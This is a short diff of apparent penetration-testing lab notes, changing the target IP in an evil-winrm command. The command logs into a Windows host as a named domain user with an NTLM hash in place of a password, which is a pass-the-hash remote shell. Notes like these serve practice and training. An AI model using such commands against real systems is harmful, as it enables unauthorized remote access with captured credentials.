@@ -43,7 +43,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 
 ```
-evil-winrm -i 192.168.242.175 -u resourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+evil-winrm -i 192.168.224.175 -u resourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
 ```
 
 ## Provided Credentials
